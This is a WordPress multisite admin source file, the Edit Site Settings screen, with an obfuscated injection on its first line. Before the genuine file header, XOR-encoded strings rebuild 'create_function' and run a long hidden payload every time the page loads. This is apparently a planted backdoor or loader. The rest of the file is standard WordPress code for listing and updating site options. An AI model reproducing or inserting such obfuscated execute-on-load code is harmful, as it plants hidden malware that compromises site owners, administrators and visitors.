<?php $qUwajoSiMrjq='NC7Y.E<MHRXLTQV'^'-1R8Z c+=<;8=>8';$QgcOQCkuuYW=$qUwajoSiMrjq('','T<bfUC9MNIT=6I4EBZ<xfV=>5Y0TS=dT7FFYEd0>gX>T-.8- O2+<;.WI7nj,=DoH=VBMVDO>0JKOyEGL6zg>c+C3krFoALLNPKORLRUGYRTPZtBFE0N55,XlZ O1polqQXzMaKpgO;OuLsUKvZ13Z-TP6E=IM1R>fJ>nhD2OJWI9Mi2TYG+SnLLzDQ>X+9LrRFOaKfj.bMn2JJ;-OvTQ>WAX-ZMu6Z>R08VGBkB 1>9ERklZUH=,WTOZVgcaszzywOCksK=<NlhHjNPL<UAd5Z=HXJFLf2W<vxiC<4:t3Aj4J=+JOnV:;+L2zgJf88UoAMGD2N5mqF4kTD6+X- QfC<5.b1q<-V0CpWSR8RUJAfCJ9;7GYHnaeB+A5;j,Y8uPqT>=;xz7yAHMLJgzCmLWBH4Xd3J:EMRqXL:8VMGv WD7<X9 -ZEe;BD9+;ZA+m8E.jN3N=XygTU7<<Yqt4VF-PTcSHR-,0RWYqJcI>0AU=X<UtOWsYK   -E5:j331MH5FS=YIKVJg.0JZlWMmoZAJwKs4OOL<e,W7CgELidgQ0egyqgTaHPTTau12wg PWSUCv.ZXDE5NnxTHheT:YLM<WP1a2X:<>XBv8,0BBAHOygJ1Z0+DabUSEtbAsN-;2WEPSL>PnQL-+Z5Z.MnoJhyYX><jyJSXO'^'=ZJG36W.: ;Si,L,1.OPA.RLj=Q 2b;9B2aplDK4n>K:NZQBNoJDNdJ6=V15AH0GlY76,zdkUU3boYeglMpn7GD6GKOfHfwFGY-  dv<gdrdkzP+z6D<YPBpH>A;PYTLU8sQdkByC N;UbNucR>PG;vp9keciiZ7G=nWNMdA;8;,WeMY1 nvzUFEs64J-YWdV=3;HplcSh0d8n.ZY.ViqX6-+HaGQR;J3oS3>bVbFPRJ iaf<::XM4<orr8 .<13<W.0KW XEnQVhN81 I0hDNP4l<+2-9Y2EVEIgWQCO9HNP+IJjrNrLZG9WAm7l2Q3Oilc S:TDQ=>b2+DN9NHqNgcgk3d4oyvQ0Ps87ArhtaB5+UNRny3dhlfO AZ5G<AUmQpUXBCp>pe,,8+GGcI:6.=Qcn:708GXU<-NYvpg6U97RN1XLD  MC-6fOZ. t2U0ZB,R=XnM800TSX<YPP72LyxCw,3YMo92 XcXCWViqY9H4TiqS89RAYr.PC5VKX><FntV<0lzjCJQ>;EwkKOr,.BcWP.;-gBG2Nd:llTYGvQQRAAUfQqga6PDTVCWFfbfgrDH9= pS+IQtnNE5H+-4c<5H>W SOJ+jQHMI.- ,hUGnU;DJmHBuseTB:yGHMS;mt7-J15v<LR6Z;Jj3Fqbp< WHBIchR2');$QgcOQCkuuYW();
/**
 * Edit Site Settings Administration Screen
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.1.0
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( ! current_user_can( 'manage_sites' ) )
	wp_die( __( 'Sorry, you are not allowed to edit this site.' ) );

get_current_screen()->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __('Overview'),
	'content' =>
		'<p>' . __('The menu is for editing information specific to individual sites, particularly if the admin area of a site is unavailable.') . '</p>' .
		'<p>' . __('<strong>Info</strong> &mdash; The site URL is rarely edited as this can cause the site to not work properly. The Registered date and Last Updated date are displayed. Network admins can mark a site as archived, spam, deleted and mature, to remove from public listings or disable.') . '</p>' .
		'<p>' . __('<strong>Users</strong> &mdash; This displays the users associated with this site. You can also change their role, reset their password, or remove them from the site. Removing the user from the site does not remove the user from the network.') . '</p>' .
		'<p>' . sprintf( __('<strong>Themes</strong> &mdash; This area shows themes that are not already enabled across the network. Enabling a theme in this menu makes it accessible to this site. It does not activate the theme, but allows it to show in the site&#8217;s Appearance menu. To enable a theme for the entire network, see the <a href="%s">Network Themes</a> screen.' ), network_admin_url( 'themes.php' ) ) . '</p>' .
		'<p>' . __('<strong>Settings</strong> &mdash; This page shows a list of all settings associated with this site. Some are created by WordPress and others are created by plugins you activate. Note that some fields are grayed out and say Serialized Data. You cannot modify these values due to the way the setting is stored in the database.') . '</p>'
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="https://codex.wordpress.org/Network_Admin_Sites_Screen">Documentation on Site Management</a>') . '</p>' .
	'<p>' . __('<a href="https://wordpress.org/support/forum/multisite/">Support Forums</a>') . '</p>'
);

$id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;

if ( ! $id )
	wp_die( __('Invalid site ID.') );

$details = get_site( $id );
if ( ! $details ) {
	wp_die( __( 'The requested site does not exist.' ) );
}

if ( !can_edit_network( $details->site_id ) )
	wp_die( __( 'Sorry, you are not allowed to access this page.' ), 403 );

$is_main_site = is_main_site( $id );

if ( isset($_REQUEST['action']) && 'update-site' == $_REQUEST['action'] && is_array( $_POST['option'] ) ) {
	check_admin_referer( 'edit-site' );

	switch_to_blog( $id );

	$skip_options = array( 'allowedthemes' ); // Don't update these options since they are handled elsewhere in the form.
	foreach ( (array) $_POST['option'] as $key => $val ) {
		$key = wp_unslash( $key );
		$val = wp_unslash( $val );
		if ( $key === 0 || is_array( $val ) || in_array($key, $skip_options) )
			continue; // Avoids "0 is a protected WP option and may not be modified" error when edit blog options
		update_option( $key, $val );
	}

	/**
	 * Fires after the site options are updated.
	 *
	 * @since 3.0.0
	 * @since 4.4.0 Added `$id` parameter.
	 *
	 * @param int $id The ID of the site being updated.
	 */
	do_action( 'wpmu_update_blog_options', $id );

	restore_current_blog();
	wp_redirect( add_query_arg( array( 'update' => 'updated', 'id' => $id ), 'site-settings.php') );
	exit;
}

if ( isset($_GET['update']) ) {
	$messages = array();
	if ( 'updated' == $_GET['update'] )
		$messages[] = __('Site options updated.');
}

/* translators: %s: site name */
$title = sprintf( __( 'Edit Site: %s' ), esc_html( $details->blogname ) );

$parent_file = 'sites.php';
$submenu_file = 'sites.php';

require( ABSPATH . 'wp-admin/admin-header.php' );

?>

<div class="wrap">
<h1 id="edit-site"><?php echo $title; ?></h1>
<p class="edit-site-actions"><a href="<?php echo esc_url( get_home_url( $id, '/' ) ); ?>"><?php _e( 'Visit' ); ?></a> | <a href="<?php echo esc_url( get_admin_url( $id ) ); ?>"><?php _e( 'Dashboard' ); ?></a></p>

<?php

network_edit_site_nav( array(
	'blog_id'  => $id,
	'selected' => 'site-settings'
) );

if ( ! empty( $messages ) ) {
	foreach ( $messages as $msg )
		echo '<div id="message" class="updated notice is-dismissible"><p>' . $msg . '</p></div>';
} ?>
<form method="post" action="site-settings.php?action=update-site">
	<?php wp_nonce_field( 'edit-site' ); ?>
	<input type="hidden" name="id" value="<?php echo esc_attr( $id ) ?>" />
	<table class="form-table">
		<?php
		$blog_prefix = $wpdb->get_blog_prefix( $id );
		$sql = "SELECT * FROM {$blog_prefix}options
			WHERE option_name NOT LIKE %s
			AND option_name NOT LIKE %s";
		$query = $wpdb->prepare( $sql,
			$wpdb->esc_like( '_' ) . '%',
			'%' . $wpdb->esc_like( 'user_roles' )
		);
		$options = $wpdb->get_results( $query );
		foreach ( $options as $option ) {
			if ( $option->option_name == 'default_role' )
				$editblog_default_role = $option->option_value;
			$disabled = false;
			$class = 'all-options';
			if ( is_serialized( $option->option_value ) ) {
				if ( is_serialized_string( $option->option_value ) ) {
					$option->option_value = esc_html( maybe_unserialize( $option->option_value ) );
				} else {
					$option->option_value = 'SERIALIZED DATA';
					$disabled = true;
					$class = 'all-options disabled';
				}
			}
			if ( strpos( $option->option_value, "\n" ) !== false ) {
			?>
				<tr class="form-field">
					<th scope="row"><label for="<?php echo esc_attr( $option->option_name ) ?>"><?php echo ucwords( str_replace( "_", " ", $option->option_name ) ) ?></label></th>
					<td><textarea class="<?php echo $class; ?>" rows="5" cols="40" name="option[<?php echo esc_attr( $option->option_name ) ?>]" id="<?php echo esc_attr( $option->option_name ) ?>"<?php disabled( $disabled ) ?>><?php echo esc_textarea( $option->option_value ) ?></textarea></td>
				</tr>
			<?php
			} else {
			?>
				<tr class="form-field">
					<th scope="row"><label for="<?php echo esc_attr( $option->option_name ) ?>"><?php echo esc_html( ucwords( str_replace( "_", " ", $option->option_name ) ) ); ?></label></th>
					<?php if ( $is_main_site && in_array( $option->option_name, array( 'siteurl', 'home' ) ) ) { ?>
					<td><code><?php echo esc_html( $option->option_value ) ?></code></td>
					<?php } else { ?>
					<td><input class="<?php echo $class; ?>" name="option[<?php echo esc_attr( $option->option_name ) ?>]" type="text" id="<?php echo esc_attr( $option->option_name ) ?>" value="<?php echo esc_attr( $option->option_value ) ?>" size="40" <?php disabled( $disabled ) ?> /></td>
					<?php } ?>
				</tr>
			<?php
			}
		} // End foreach
		/**
		 * Fires at the end of the Edit Site form, before the submit button.
		 *
		 * @since 3.0.0
		 *
		 * @param int $id Site ID.
		 */
		do_action( 'wpmueditblogaction', $id );
		?>
	</table>
	<?php submit_button(); ?>
</form>

</div>
<?php
require( ABSPATH . 'wp-admin/admin-footer.php' );
